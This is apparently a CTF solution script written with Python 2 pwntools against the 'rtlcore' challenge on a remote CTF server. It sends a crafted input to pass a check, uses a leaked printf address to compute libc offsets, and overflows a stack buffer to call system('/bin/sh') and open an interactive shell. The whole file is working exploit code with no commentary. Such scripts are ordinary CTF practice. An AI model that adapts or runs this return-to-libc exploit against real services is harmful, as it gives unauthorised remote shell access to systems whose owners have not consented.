from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3015)
#p = process('./rtlcore')

part1 = 0x2691f021
part2 = part1+2

print p.recvuntil(': ')
payload = ''
payload += p32(part1)*4 + p32(part2)

p.sendline(payload)

print p.recvline()
printf = int(p.recvline().split(' ')[4], 16)

libc_base = printf - 0x49020
system = libc_base + 0x3a940
binsh = libc_base + 0x15902b

payload = ''
payload += 'a'*0x3e + 'b'*4
payload += p32(system)
payload += 'A'*4
payload += p32(binsh)

p.sendline(payload)
sleep(0.5)
p.interactive()


